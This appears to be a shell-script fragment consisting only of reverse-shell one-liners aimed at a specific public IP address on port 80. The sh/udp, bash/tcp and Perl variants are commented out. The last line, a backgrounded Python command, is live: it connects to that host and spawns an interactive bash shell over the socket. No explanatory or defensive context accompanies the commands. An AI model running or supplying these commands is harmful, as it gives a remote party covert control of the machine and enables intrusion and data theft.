
#sh -i >& /dev/udp/3.123.202.19/80 0>&1
#bash -i >& /dev/tcp/3.123.202.19/80 0>&1


#nohup perl -e 'use Socket;$i="3.123.202.19";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &;

nohup python3 -u -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.123.202.19\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")" &

